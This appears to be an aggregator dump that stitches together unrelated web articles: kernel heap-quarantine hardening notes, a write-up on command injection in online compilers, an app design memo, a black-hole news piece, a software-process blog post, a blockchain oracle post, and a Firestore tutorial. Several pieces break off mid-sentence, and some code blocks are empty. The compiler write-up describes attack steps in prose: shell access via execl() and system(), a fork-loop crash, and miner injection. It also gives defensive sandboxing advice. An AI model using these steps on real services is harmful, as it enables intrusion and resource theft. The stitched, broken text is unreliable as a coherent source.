The randomized quarantine then releases the freed object at an unpredictable moment:</p>

<div><div><pre><code>   lkdtm: Target object is reallocated at attempt 107884
   lkdtm: Target object is reallocated at attempt 265641
   lkdtm: Target object is reallocated at attempt 100030
   lkdtm: Target object is NOT reallocated in 400000 attempts
   lkdtm: Target object is reallocated at attempt 204731
   lkdtm: Target object is reallocated at attempt 359333
   lkdtm: Target object is reallocated at attempt 289349
   lkdtm: Target object is reallocated at attempt 119893
   lkdtm: Target object is reallocated at attempt 225202
   lkdtm: Target object is reallocated at attempt 87343
</code></pre></div></div>

<p>However, this randomization alone would not stop the attacker:
the quarantine stores the attacker's data (the payload) in the sprayed objects!
This means the reallocated and overwritten vulnerable object contains the payload
until the next reallocation (very bad!).</p>

<p>This makes it important to <strong>erase heap objects before placing them in the heap quarantine</strong>.
Moreover, filling them with zeros gives a chance to detect UAF
accesses to non-zero data for as long as an object stays in the quarantine (nice!).
That functionality already exists in the kernel, it's called <code>init_on_free</code>.
<a href="https://www.openwall.com/lists/kernel-hardening/2020/09/29/5">I integrated it</a> with <code>CONFIG_SLAB_QUARANTINE</code> as well.</p>

<p>During that work I found a bug: in <code>CONFIG_SLAB</code>, <code>init_on_free</code> happens too
late. Heap objects go to the KASAN quarantine while still "dirty." I provided the fix
in a <a href="https://www.openwall.com/lists/kernel-hardening/2020/09/29/4">separate patch</a>.</p>

<p>For a deeper understanding of the heap quarantine's inner workings, I provided an <a href="https://www.openwall.com/lists/kernel-hardening/2020/09/29/8">additional
patch</a>, which contains verbose debugging (not for merge).
It's very helpful, see the output example:</p>

<div><div><pre><code>   quarantine: PUT 508992 to tail batch 123, whole sz 65118872, batch sz 508854
   quarantine: whole sz exceed max by 494552, REDUCE head batch 0 by 415392, leave 396304
   quarantine: data level in batches:
     0 - 77%
     1 - 108%
     2 - 83%
     3 - 21%
   ...
     125 - 75%
     126 - 12%
     127 - 108%
   quarantine: whole sz exceed max by 79160, REDUCE head batch 12 by 14160, leave 17608
   quarantine: whole sz exceed max by 65000, REDUCE head batch 75 by 218328, leave 195232
   quarantine: PUT 508992 to tail batch 124, whole sz 64979984, batch sz 508854
   ...
</code></pre></div></div>

<p>The heap quarantine <code>PUT</code> operation you see in this output happens during kernel memory freeing.
The heap quarantine <code>REDUCE</code> operation happens during kernel memory allocation, if the quarantine
size limit is exceeded. The kernel objects released from the heap quarantine return to the allocator
freelist – they are actually freed.
In this output, you can also see that on <code>REDUCE</code>, the quarantine releases some part of
a randomly chosen object batch (see the <a href="https://www.openwall.com/lists/kernel-hardening/2020/09/29/6">randomization patch</a> for more details).</p>



<p>I made <a href="https://www.openwall.com/lists/kernel-hardening/2020/10/01/7">brief performance tests</a> of the quarantine PoC on real hardware and in virtual machines:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://serhack.me/images/compilers/1.png" alt="Compilers security report"></p><p>Online compilers are a handy tool to save time and resources for coders, and are freely available for a variety of programming languages. They are useful for learning a new language and developing simple programs, such as the ubiquitous <a href="https://en.wikipedia.org/wiki/%22Hello,_World!%22_program">“Hello World”</a> exercise. I often use online compilers when I am out, so that I don’t have to worry about locating and downloading all of the resources myself.</p><p>Since these online tools are essentially remote compilers with a web interface, I realized that I might be able to take remote control of the machines through command injection. My research identified a common weakness in many compilers: inadequate sanitization of user-submitted code prior to execution. My analysis revealed that this lack of input filtration enables exploits that an hacker can use to take control of the machine or deliberately cause it to crash.</p><p>A clever attacker can exploit built-in C functions and POSIX libraries to gain control over the computer hosting the online compiler. Commands like <a href="https://linux.die.net/man/3/execl">execl()</a>, <a href="https://linux.die.net/man/3/system">system()</a>, and <a href="https://linux.die.net/man/3/getenv">GetEnv()</a> can be used to probe the target machine operating system and run any command on its built-in shell.</p><p>I wanted to write this article to remind how sandboxed environment are important when shipping an application such as this!</p><h2 id="vulnerability-description">Vulnerability description</h2><p>In this section, I will introduce the reader to the vulnerability explaining both theory and practice processes.</p><h3 id="gaining-access">Gaining access</h3><p>In several of the C/C++ compilers that I analyzed, the GetEnv(), system(), functions allow an attacker to study and execute any command on the remote machine. The GetEnv() function allows a hacker to learn information about the machine that is otherwise concealed from the web interface, such as the username and OS version.</p><p>Once this information is revealed, the attacker can begin testing various exploits to achieve privilege escalation and gain access to a root shell. For example, the system() command can be used to execute malicious code and access sensitive data such as logs, website files, etc.</p><p>Since the exploit I discovered involves inserting hostile commands to gain control of an unwitting machine, this attack vector is classified as a <a href="https://en.wikipedia.org/wiki/Code_injection">code injection</a> vulnerability.</p><h3 id="maintaining-control">Maintaining control</h3><p>If hacker tries to run the online compiler every time they want to send a new command, the attack would leave an obvious trace, and the resource use might draw attention to the suspicious activity. These obstacles can be conveniently sidestepped by using the execl() function, which allows the user to specify any arbitrary program to replace the current process. An attacker can gain access to the machine’s built-in shell by invoking the execl() function to replace the current process with <code>/bin/sh</code>, with catastrophic implications.</p><p>Many compilers allow input from the browser, in which case the hacker can craft a program to relay input commands to the shell of the compromised machine. Once the hacker uses <code>execl()</code> to open a shell via browser, they can simply operate the remote machine using <code>system()</code> to inject various instructions. This avoids the need to run the compiler each time the attacker wishes to explore or exploit the compromised machine.</p><h3 id="implications">Implications</h3><p>A hacker that obtains shell access in this way gains access to files and services typically protected from outside users. The attacker now has many options at their disposal for exploiting the machine and/or wreaking havoc; how they proceed will depend on their tools and motives.</p><p>If the attacker wishes to crash the target machine, they can achieve this by (mis)using the fork() function, which creates <a href="https://serhack.me/articles/introduction-to-monerov-and-its-inherent-risks/"><del>a new cryptocurrency</del></a> clone of the current process. A fork() function placed within a while (true) loop will execute indefinitely, repeatedly cloning the process to greedily consumed precious RAM memory. This rapid uncontrolled use of resources will overwhelm the machine, causing a self-DOS (denial of service attack).</p><p>Instead of maliciously crashing a machine, an attacker may wish to monetize their illicit access. This can be accomplished by injecting a cryptocurrency miner, which will generate funds for the attacker at the expense of the victim’s computational resources and electric bill. My analysis showed that this maneuver allows useful exploitation of online compilers that successfully stymied other attacks by sandboxing the environment or adopting more advanced techniques to limit file access.</p><h3 id="theory">Theory</h3><p>This section documents the commands used to gain and maintain access to the online compiler.

Access to protected files and services can be prevented by creating a secure sandbox for the application.

In order to avoid these “mining” attacks, the sandbox should have limited resources and it should be able to reboot itself every 10 minutes.</p><p>To eliminate the underlying weakness, the libraries could be recompiled without the particular exploitable functions. An attacker cannot gain a foothold if the execl() and system() are removed or disabled by recompiling libraries.</p><p>In addition to this, tools such as <a href="https://docker.com/">Docker</a> might be used to create a sandboxed environment. A sandbox is a mechanism to run applications in a limited space. It usually provides a restricted and controlled set of resources to the program that needs to be tested, such as a restricted area of memory or a set of limited system calls; normally, network access, the ability to inspect the host system or read from input devices, are disabled or highly restricted.</p><p>At the time of my search, I found at least two compilers with a non-sandboxed environment. I contacted the managers and they resolved in less than a week. For others I verified that they were actually under a sandboxed environment. Injected scripts were immediately identified and the “malicious” user was banned.</p><p>Do you have any suggestions for my articles?

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      
      
<p>An infinite canvas sounds appealing, but there's a reason the page model is so widely used in productivity tools. Read on to learn why, and how you can help test an infinite canvas for Muse.</p>

<p>When using Muse in portrait mode, you might wonder: what’s the deal with that black bar?</p>

<img src="https://museapp.com/memos/2020-12-infinite-canvas/muse-bars.png" alt="Muse with black bar in portrait mode">

<p>The dead space is because Muse currently uses a page-based visual model. Boards are created in landscape orientation by default. The black bar you see here is the same as viewing a landscape-orientation photo on your iPad in portrait orientation, which places black bars above and below.</p>

<img src="https://museapp.com/memos/2020-12-infinite-canvas/photos-bars.jpg" alt="Photos app with black bars in portait mode">

<p>This puts Muse in good company: most productivity apps including presentation software like Keynote or <a href="https://pitch.com/">Pitch</a>, word processors like Google Docs, and digital sketchbooks like <a href="https://paper.bywetransfer.com/">Paper</a> use a page model.</p>

<figure>
  <img src="https://museapp.com/memos/2020-12-infinite-canvas/goodnotes-pages.png" alt="GoodNotes screenshot">
  <figcaption><p>The beautifully-designed digital sketchbook <a href="https://www.goodnotes.com/">GoodNotes</a> uses a page-based model.</p></figcaption>
</figure>

<p>The ancestry of these apps trace back to paper-based counterparts. So perhaps this is just an artifact of the analog medium, needlessly carried forward into digital?</p>

<p>But there’s more to it than that: the page model provides structure, a sense of scale, and a way for the user to orient themselves. As a thought experiment, imagine a slide deck creator where every slide started in the center and was of potentially infinite size. A concept like “I’ll put this on the side, since it’s less important” becomes meaningless when there are no sides.</p>

<h2>Infinite canvas in design tools</h2>

<p>That brings us to the “infinite canvas” lineage of design tools: Illustrator, Sketch, Figma. Designers love the ability to arrange artboards spatially to show user flows or sets of design variations. But to date there are few examples of successful infinite canvas apps outside the realm of design.</p>

<figure>
  <img src="https://museapp.com/memos/2020-12-infinite-canvas/figma-canvas.png" alt="Figma screenshot">
  <figcaption>
    <p>Figma is the archetype for design tools with an infinite canvas.</p>
  </figcaption>
</figure>

<p>So why not “just” remove the boundaries, and create boards with no edges?</p>

<p>The ability to <a href="https://museapp.com/handbook#to-expand-a-board">expand boards</a> on one axis is how Muse works today. It’s still a page: just one you can make wider, like a spool of paper. But our experiments have shown that this starts to break down as you add more directions of freedom. The user quickly finds themselves disoriented, like floating in an endless white void. (Maybe you can find <a href="https://www.change.org/p/apple-free-jony-ive-from-his-white-room">Jony Ive's white room</a> out there somewhere!)</p>

<p>One solution is adding arbitrary zooming, like Figma: pull out to see the landscape, pull back in to do detail work. But this adds another layer of confusion because there is no consistent sense of scale. For example, if you can start drawing at an arbitrary zoom level, what happens with your ink thickness? And that's without working through the interface and mental-model collision of Muse's nested boards and spatial navigation.</p>

<p>So that's the tradeoff: the page model great for getting the user oriented and having a sense of scale and structure. Yet with Muse we’ve seen that the page model is irritating not just for those black bars in portrait mode, but also when you get to the edge of the board and just need a tad more space.</p>

<h2>Designing a solution</h2>

<p>The Muse team has spent the last few weeks on intensive design prototyping to explore whether we can find a better tradeoff. Is there a sweet spot that gets the best parts of an infinite canvas (feeling of spatiousness and unconstrained creation) with the best parts of the page model (feeling of groundedness and orientation)?</p>

<figure>
  <img src="https://museapp.com/memos/2020-12-infinite-canvas/prototype-origami.png" alt="Origami Studio screenshot">
  <img src="https://museapp.com/memos/2020-12-infinite-canvas/prototype-html.png" alt="HTML prototype">

  </figcaption>
</figure>

<p>Some choices we made based on these explorations:</p>

<ul>
<li><strong>Boards are anchored in the upper-left.</strong> We found having two clear “edges” of the board is a nice way to orient, since there’s a clear starting place and then two possible directions to grow (right or down).</li>
<li>Rather than explicitly adding board space, you move content (a card or ink) into empty space. The <strong>board is always the size of its content</strong>. However we also have some prototypes with more explicit edges and make-space gestures; we'll continue to play with this.</li>
<li>We avoid some of the “lost in a white void” problem by <strong>preventing scrolling to completely empty space</strong>. You can't scroll over five screens worth and then drop a single dot of ink.</li>
<li>Scroll bars don’t make as much sense in this setup; we’re <strong>experimenting with <a href="https://gamedevelopment.tutsplus.com/tutorials/positioning-on-screen-indicators-to-point-to-off-screen-targets--gamedev-6644">offscreen content indicators</a>, inspired by open-world video games</strong>.</li>
</ul>

<p>And here's an early look at this implemented in Muse:</p>

<video preload="metadata" muted="" loop="" playsinline="" autoplay="">
  <source src="https://media.museapp.com/website/2020-11-30-infinite-canvas.mp4#t=0.01">
</video>

<h2>Open questions</h2>

<p>This is still early. One thing we’ve seen in testing already is that having more space on a board makes the user less inclined to create sub-boards. This is good for creation (less effort) but not as good for reading (nested exploration is more approachable than a huge two-dimensional board).</p>

<p>There are also big new technical challenges with these boards. In the released product, we may end up limiting the board size to manage this. So less “infinite” and more “open, two-axis expansion”—though that doesn’t quite have the same ring.</p>

<h2>Join the beta</h2>

<p>This is still a work-in-progress, but it’s far enough along that we’d like to get customer input. Is this an improvement over the current page-based model? That’s something only real-world use will tell.</p>

     <p id="u7235-5">The Future of Text Book : A 2020 Vision</p>
     
     
     <p id="u7235-16">Growing out of the annual <a href="https://www.thefutureoftext.org/symposium.html" data-href="page:U74">Symposium</a><span id="u7235-11">, </span>we have put together a book published by <a href="https://futuretextpublishing.com/">Future Text Publishing</a> on the possible futures of text which has turned out to be the largest survey of the future of text ever undertaken, with a wide range of different perspectives and inspirations.</p>
     
     <p id="u7235-22">The book is intended to be a collection of dreams for how we want text to evolve as well as how we understand our current textual infrastructures, how we view the history of writing and much more. The aim is to make it inspire a powerfully rich future of text in a multitude of ways today and to still have value in a thousand years and beyond<a href="https://www.thefutureoftext.org/2020-vision-book.html#publishing" data-href="anchor:U7223:U7531">*</a>. It should serve as a record for how we saw the medium of text and how it relates to our world, our problems and each other in the early twenty first century.</p>

     <p id="u7235-45">“The thing that amazed me - even humbled me - about the digital computer when I first encountered it over fifty years ago - was that, in the computer, I saw that we have a tool that does not just move earth or bend steel, but we have a tool that actually can manipulate symbols and, even more importantly, portray symbols in new ways, so that we can interact with them and learn. We have a tool that radically extends our capabilities in the very area that makes us most human, and most powerful.”</p>
     
     <p id="u7235-48">“There is a native American myth about the coyote, a native dog of the American prairies - how the coyote incurred the wrath of the gods by bringing fire down from heaven for the use of mankind, making man more powerful than the gods ever intended. My sense is that computer science has brought us a gift of even greater power, the ability to amplify and extend our ability to manipulate symbols…”</p>
     
     <p id="u7235-56">“We need to become better at being humans. <span id="u7235-51">Learning to use symbols and knowledge in new ways, across groups, across cultures, is a powerful, valuable, and very human goal. </span>And it is also one that is obtainable, if we only begin to open our minds to full, complete use of computers to augment our most human of capabilities.”<br><a href="http://dougengelbart.org/content/view/348/000/"><span id="u7235-54">Douglas C.

						<p>For the longest time, scientists firmly believed that once something fell into a black hole, it would be quite literally impossible for it to get back out. Now, for the first time, new research shows that this may not be the case entirely.</p>

<p>To understand this arguably groundbreaking news about black holes, you must first understand what is known as the “black hole information paradox.” This paradox stems from calculations suggesting that any physical information that falls into a black hole permanently disappears, which in itself violates a core concept of modern physics. This is that the value of a wave function at one point in time should also determine its value at any other time. Simply put, information cannot be destroyed.</p>
<p>Some physicists who study black holes have even gone as far as to say that the simple fact that black holes exist shows that there are other layers to reality itself. This type of thinking is formed from the fact that black holes behave in ways that don’t make sense with traditional physics. The very nature of space-time itself begins to break down as you look deeper and deeper into black holes.</p>
<p>Scientists now believe that black holes of great age no longer retain every bit of physical information that falls into them. In fact, they believe that the mechanism that prevented all of that information from escaping is actually reversed.</p>

<p>As Quanta put it, “If you jump into one, you will not be gone for good. Particle by particle, the information needed to reconstitute your body will reemerge.” This has been a popular theory among string theory believers for some time, but this is the first time there has been some evidence to support it.</p>
<p>Information would be able to slowly seep its way out of the grasp of a black hole through gravity itself. However, the math only checks out with a bit of quantum physics sprinkled in as well. This thinking adds a new aspect to black holes — a quantum halo.</p>
<p>A quantum halo effect added to black holes would allow them to interact with their surroundings via small fluctuations in space-time, ultimately allowing information to escape exceptionally slowly. So slowly, in fact, that if you fell into a black hole, by the time all of your information finally escaped, nothing would be alive in the entire universe.</p>
<p>While this is great progress in the quest to solve the black hole information paradox, it is far from a complete solution. In order for this new theory to check out, changes need to be made to the notion of locality, a monumental task.</p>

December 2, 2020 | https://adventures.michaelfbryan.com/posts/turning-feature-requests-into-code/ | <a href="https://web.archive.org/web/*/https://adventures.michaelfbryan.com/posts/turning-feature-requests-into-code/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>As part of my previous job I worked on a CAD/CAM package, and a very common
task would be to take a vague feature description, rephrase it as a more
formal software problem, then use computational geometry algorithms to turn
it into code which can be integrated into the overall application.</p><p>I eventually got quite good at this, so I’m going to write down the system I
came up with. This process works especially well for larger features which
add new functionality with minimal coupling to existing code.</p><p>If you found this useful or spotted a bug, let me know on the blog’s
<a href="https://github.com/Michael-F-Bryan/adventures.michaelfbryan.com">issue tracker</a>!</p><h2 id="step-1-research">Step 1: Research</h2><p>While you <em>can</em> dive into the code immediately, a lot of the time creating your
own solution from scratch will lead to an implementation with logic/design
flaws.</p><p>This is especially the case when you are working on things requiring complex
algorithms or mathematical concepts.</p><h3 id="understanding-the-problem">Understanding the Problem</h3><p>Often the problem you are given won’t be something straightforward like
<em>“implement A* path finding”</em>. Feature descriptions normally come from a
non-programmer and will be something a lot less precise, like</p><blockquote><p>I want to display a CAD drawing in the background, then when I click points
on the drawing you should create a path which goes from A to B to C taking the
shortest path along that drawing without doubling back on itself.</p></blockquote><p>Often important bits will be left out, too.</p><blockquote><p>Oh, and this background drawing may have points added or removed at any time.</p></blockquote><p>(i.e. we need to deal with mutation)</p><p>Unfortunately, that’s a bit too vague to turn into code and Googling a
problem statement like that won’t be very helpful! What we want is a
description of the problem which can be phrased as computer operations.</p><p>When I’m given a vague feature description the first thing I’ll do is draw it
out. Seeing something visualised is often enough to summon the correct keywords
to rephrase the problem in a more searchable form.</p><p>I don’t know about you, but when I see something like this, my first thought is
that we’re doing pathfinding. We’re also trying to optimise for the shortest
distance while preferring untraversed edges.</p><figure><img src="https://adventures.michaelfbryan.com/img/link-lines.gif" alt="Animation of the expected interaction" width="75%"><figcaption><p>Problem visualised (black lines are the background image, red X means click, red lines are the desired path)</p></figcaption></figure><p>Don’t forget to come up with an unambiguous definition of <em>“done”</em>. This lets
you determine when the feature request has been fulfilled, and gives you a way
to ward off <a href="https://www.wrike.com/project-management-guide/faq/what-is-scope-creep-in-project-management/">scope creep</a>.</p><div><p>This example came was one of the feature requests which taught me the
importance of getting the full picture up front and leaving yourself room to
make changes down the track.</p><p>In this case, I’d created a component for doing pathfinding by converting the
“background drawing” into a graph and passing it to <em>A*</em>, but neglected to
ask whether the background drawing would change.</p><p>Only after I’d finished integrating the component into the overall CAD/CAM
package did I find out that we need a way to add a path midway along an edge
of the background drawing (mutating the graph by removing an edge and
replacing it with two smaller edges). I’m a big fan of immutability, so you
can see how this might be a problem.</p><p>We ended up needing to rewrite the component because immutability was so
deeply ingrained into its implementation… I’d engineered myself into a
corner!</p></div><p>If your problem involves a lot of maths (like a lot of my computational
geometry work) it’s a good idea to draw sketches and try to work out the
solution by hand. This also lets you derive equations that you’ll need later
on.</p><h2 id="searching-for-prior-art">Searching for Prior Art</h2><p>Once you can phrase the problem in computer terms it’s time to pull out the
programmer’s most powerful tool… The internet.</p><p>You’re looking anything relevant to the problem at hand. This may take the form
of:</p><ul><li>Wikipedia - usually my first port of call</li><li>Blog posts exploring similar problems</li><li>Academic Papers - tend to be quite information-dense and go into <em>much</em> more
detail than you care about, but a quick skim through will often find pictures
or algorithms that are useful</li><li>Existing Products or Libraries - why waste weeks reimplementing the wheel?</li></ul><p>I’ll often end up with 20-40 open tabs with promising items from the first
couple pages of search results, then I’ll skim through the content on each
tab, also checking out interesting things <em>those</em> pages link to.</p><p>Continuing with our example from before where we’re wanting to find the path
from one point to another preferring to use unvisited edges, I might search
for things like:</p><ul><li>Pathfinding</li><li>Pathfinding preferred</li><li>Pathfinding algorithm</li><li>Incremental pathfinding (because it’ll happen over multiple user interactions)</li><li>Undirected weighted graph traversal</li></ul><p>My definition of “interesting” is anything which seems to mention keywords from
my problem. Algorithm names are particularly useful.</p><p>This <a href="https://www.redblobgames.com/pathfinding/a-star/introduction.html"><em>Introduction to the A* Algorithm</em></a> link ticks a lot
of those boxes. Plus it seems to be a tutorial with lots of code snippets and
pictures, which will be handy when it gets to the implementation.</p><p><img src="https://adventures.michaelfbryan.com/img/pathfinding-search-results.png" alt="Search result showing “Introduction to the A\* Algorithm” with certain words highlighted"></p><h2 id="step-2-thinking-about-the-public-api">Step 2: Thinking About the Public API</h2><p>No code exists in a vacuum, so knowing how the outside world will use your
feature has a big effect on how it will be integrated into the rest of the
application.</p><p>In this stage you develop a big picture view of the feature and how it will
expose its functionality to the outside world.</p><p>The feature’s public API also acts as a natural seam that you can use for
testing (e.g. mocking out the component when testing the application) and to
allow you to restructure the feature’s implementation (or swap it out
entirely) without breaking the rest of the application.</p><p>Every feature will be used differently so it’s hard to provide concrete
examples, but here some questions to ask yourself:</p><ul><li>Is this a well-contained batch process or is the feature interactive?</li><li>What are my inputs and outputs?</li><li>Are there any hard constraints imposed by the implementation?</li><li>If the process will take a long time (i.e. more than 100ms), does it need to
report progress or support cancellation?</li><li>Do I need to let the caller update the feature’s internal state? (e.g. when
altering the “background drawing” from the earlier example)</li><li>How are we going to report failure?</li><li>Is there information the caller will need to provide? (see <a href="https://www.freecodecamp.org/news/a-quick-intro-to-dependency-injection-what-it-is-and-when-to-use-it-7578c84fa88f/"><em>Dependency
Injection</em></a> and the <a href="https://refactoring.guru/design-patterns/strategy">Strategy Pattern</a>)</li><li>Is this a thin interface, or will I need to leak a lot of implementation
details to the caller? (see <a href="https://www.joelonsoftware.com/2002/11/11/the-law-of-leaky-abstractions/"><em>The Law of Leaky Abstractions</em></a>)</li><li>Would I reasonably want to reuse this component elsewhere?</li><li>Does my language promote patterns or abstractions that would make the code
more ergonomic to use if written in a certain way? (C# has events as
first-class citizens, Go’s goroutines and channels are great for creating
streams of events, etc.)</li><li>Does the larger application provide natural mechanisms or extension points
that we can use?</li></ul><p>Answering these questions should give you an idea of how your feature will
interact with the rest of the application, and from there you can start
thinking in more concrete terms like interfaces and data types.</p><div><p>You actually don’t need to write code for this step.</p><p>My normal approach was to turn away from my computer and stare at a random
patch of wall on the other side of the office. This lets me think about how I
want to interact with the feature without being bogged down with the precise
details you get when writing code.</p></div><p>If your research indicated the feature’s implementation will be quite
complex, there are a couple tools at your disposal for limiting how much of
that complexity leaks into the wider application. Namely, by encapsulating
the problem you can paper over the complexity (see the <a href="https://refactoring.guru/design-patterns/facade"><em>Facade
Pattern</em></a>) or adding another level of <a href="https://wiki.c2.com/?OneMoreLevelOfIndirection"><em>Indirection</em></a>
(e.g. introduce a middle-man).</p><p>Try to avoid creating a “chatty” API, if possible. Making the caller go back
and forth into your code to do complex operations leads to increased coupling
and more bugs down the track.</p><h2 id="step-3-initial-implementation">Step 3: Initial Implementation</h2><p>Now you’ve done some background research and thought about the feature’s API,
it’s time to actually start implementing it. Depending on how your research
went, this stage can be either very easy or very hard.</p><h3 id="the-easy-case">The Easy Case</h3><p>If you are lucky, you may have stumbled upon a similar solution during your
research that you can reuse or adapt to fit your purposes. This was the case
with our from earlier, by analysing the feature request we were able to
reduce it to a pathfinding issue; a solved problem in computer science.</p><p>It’s really nice when this happens. Often implementation is just a case of
going to the Wikipedia page, scrolling down to <a href="https://en.wikipedia.org/wiki/A*_search_algorithm#Pseudocode">the pseudocode section</a>,
and adapting it fit the API you developed earlier.</p><p>Just remember to sprinkle in enough tests to make sure the implementation is
correct and edge cases are handled gracefully.</p><p>There’s not much more to be said here.</p><h3 id="the-not-so-easy-case">The Not-So-Easy Case</h3><p>Unfortunately, most “interesting” feature requests won’t have libraries or
tutorials you can use directly, requiring you to do a bit of original work.</p><p>A lot of the work I do has a visual or mathematical element to it, so you can
simulate the feature using pen and paper.</p><p>I’ll often start with the top-most level first, stubbing out the public API
with code that just blows up (i.e. <code>throw new NotImplementedException()</code> in C#
or <code>todo!()</code> in Rust).</p><p>From there you can start decomposing each of the functions into
sub-functions, recursively decomposing the problem into smaller problems
until you eventually reach a problem you know the solution to.</p><p>Whenever you get stuck, look back over the resources you found while
researching. You may have missed some gem of knowledge which will make
everything <em>click</em>.</p><p>An alternative to this top-down approach is attacking the problem bottom-up.
You’ll often take this approach when you know how something deep down is done,
but aren’t quite sure how to connect that with the public API.</p><p>When taking the bottom-up approach I’ll first implement the thing I know and
make sure to develop a solid foundation. Then you add higher and higher level
layers, slowly working your way towards that public API you want to expose.</p><p>In practice you’ll often use a hybrid approach, …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Introduction</h2><p>In September, it was announced that <a href="https://chain.link/" target="_blank" rel="noopener noreferrer">Chainlink</a> will come to the Stacks ecosystem. Chainlink is described as decentralized oracle network that provides reliable, tamper-proof inputs and outputs for smart contracts on any blockchain. From the view point of a smart contract developer this is just an interface (aka trait in Clarity) for a black box that can be asked a question and it will return an answer. This introduces a level of trust that lies outside of the blockchain. </p><p>The on-chain trust of a blockchain is built by the consensus algorithm. It gives trust in the state of the blockchain because the majority of the nodes verifies all state changes based on data that is stored on chain. Chainlink tries to build a trust system by self-certification and data duplication. There is an incentive for oracles to provide correct data through rewards (in LINK tokens). However, there is no explicit stake at risk for oracles if they provide incorrect data.</p><p><img src="https://gaia.blockstack.org/hub/1Af6tr97gdEF24Ds2Mat3no6P6EkcGxUkL/photos/7OpWl12AEvTSa-C12Zatn/I9gyPQhFu6H1_7cam1w13-8c35025-Request__Receive_Data.png"></p><h2>Proof-of-Stake Mixin</h2><p>The Stacks blockchain has a reliable link to the Bitcoin blockchain through Proof of Transfer. This link can be used for oracles for the bitcoin blockchain. Bitcoin oracles can answer questions like how many confirmations has a Bitcoin transaction or what is the current balance of a bitcoin address. Looking at the stacks node, these questions could be answered easily by all stacks nodes because they have already access to the Bitcoin blockchain. </p><p>A stacks node could watch out for transactions of a Bitcoin oracle question, then check the Bitcoin blockchain and send a transaction with the answer. What is more, miner nodes could do the same and include only transactions if they found the same answer. Probably, it would be the other way around: Miner nodes would send the answering transaction themselves to get the reward and all stack nodes could verify it. If they find out that the miner added a transaction with a wrong answer they could deny the miner's block reward. The blockchain would then continue with a fork containing the "correct" transaction. This means that the block reward acts as the stake for the Bitcoin oracles.</p><p><img src="https://gaia.blockstack.org/hub/1Af6tr97gdEF24Ds2Mat3no6P6EkcGxUkL/photos/7OpWl12AEvTSa-C12Zatn/FhPRhRqbx75Aq80Ds_cRL-bitcoinoracles.png"></p><h2>Wrapped Bitcoin</h2><p>With Bitcoin oracles it is easier to build wrapped Bitcoins. Wrapped Bitcoins are fungible tokens on the Stacks blockchain that correspond to Bitcoins on the Bitcoin blockchain. There is one Wrapped Bitcoins contract that creates new tokens whenever its corresponding Bitcoin address received Bitcoins. The tokens are sent to the corresponding Stacks address of the Bitcoin sender. Bitcoin oracles can be asked to confirm that the Wrapped Bitcoins are indeed backed by real Bitcoins. </p><p><img src="https://gaia.blockstack.org/hub/1Af6tr97gdEF24Ds2Mat3no6P6EkcGxUkL/photos/7OpWl12AEvTSa-C12Zatn/aJXhlBiAY3SHyI2itediE-Wrapped%20Bitcoin.png"></p><h2>Conclusion</h2><p>With the trust in Bitcoin oracles that are secured by additional Proof-of-Stake, a new class of smart contracts can be built: Smart contracts could payout Stacks loans based on Bitcoin collaterals, Bitcoin transactions could be counted as votes on the Stacks blockchain and so on.</p></div></div>]]>

<![CDATA[Introduction to Google Firestore]]>

December 2, 2020 | https://ncona.com/2020/12/introduction-to-google-firestore/ | <a href="https://web.archive.org/web/*/https://ncona.com/2020/12/introduction-to-google-firestore/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Firestore is Google’s serverless document database offering.</p>

<h2 id="what-does-serverless-mean">What does serverless mean?</h2>

<p>Serverless means that we don’t have to worry about managing the servers on which the database runs. All the management is done automatically by Google. The database will scale up or down depending on the demand.</p>

<h2 id="whats-a-document-database">What’s a document database?</h2>

<p>A document database is a non-relational database that stores data in a semi-structured format. A common format used by many document databases is JSON.</p>

<p>In a relational database, we usually create tables with a defined structure (columns and types). In a document database, it’s not necessary to specify the different columns.</p>

<!--more-->

<h2 id="concepts">Concepts</h2>

<p>There are two concepts we need to be familiar with to model our Firestore database: <code>documents</code> and <code>collections</code>.</p>

<p>A <code>document</code> is similar to a JSON object. Each top level attribute is called a <code>field</code>. A document can’t be bigger than 1MB.</p>

<p>A <code>collection</code> is a group of documents. We can think of it as a table without a schema, just a name.</p>

<p>A <code>document</code> can point to a <code>collection</code>, and <code>documents</code> in that <code>collection</code> can point to other <code>collections</code>.</p>

<h2 id="creating-a-database">Creating a database</h2>

<p>When we talk about creating a database, we are referring to making it possible to create <code>collections</code> and <code>documents</code> in Google Cloud. At the time of this writing, Firestore databases come in 2 flavors:</p>

<ul>
  <li><code>Native mode</code> - Recommended for mobile apps or browsers</li>
  <li><code>Datastore mode</code> - Recommended for back-end servers</li>
</ul>

<p>Currently there is no way to create a database in <code>datastore mode</code> using <code>gcloud</code> cli, so we need to do it from the cloud console. If we want to create a database in native mode we can use:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>gcloud firestore databases create
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This command triggers some initial setup that might take a few minutes.</p>

<p>Once we choose the mode for a Google Cloud project, it can’t be changed. If we want to change it, we would need to create a new project and create another database there.</p>

<h2 id="writing-data">Writing data</h2>

<p>In relational databases we need to define our tables and schemas in advance. That’s not the case on Firebase. Documents are created in collections. If a collection doesn’t exist, it will be created on the fly.</p>

<p>Clients exist for various programming languages. We’re going to use Golang in this article.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2

4
</pre></td><td><pre><span>mkdir</span> ~/project
<span>cd</span> ~/project
go mod init ncona.com/firestore
<span>touch </span>main.go
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Let’s write some data (<code>main.go</code>):</p>

<p>Note that <code>GcpCredentialsFile</code> must be a valid service account key with permissions for Firestore (roles/datastore.user), and <code>ProjectId</code> should be the id of the project where the database lives.</p>

<p>We can run our program with:</p>



<p>The <code>Set</code> operation creates a new record or replaces an existing one. The <code>Doc("1")</code> part of the command tells firestore to use <code>1</code> as a document identifier. There can’t be two documents with the same identifier in a collection.</p>

<p>It’s also possible to tell firestore to <code>merge</code> an existing document instead of replacing it:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1

<p>Each document we write is represented by a path. For the document we just created, this will be the path:</p>

<h2 id="indexes">Indexes</h2>

<p>A very brief note about indexes, because they work differently than in other databases. There are two types of indexes in firestore, <code>single-field indexes</code> and <code>composite indexes</code>.</p>

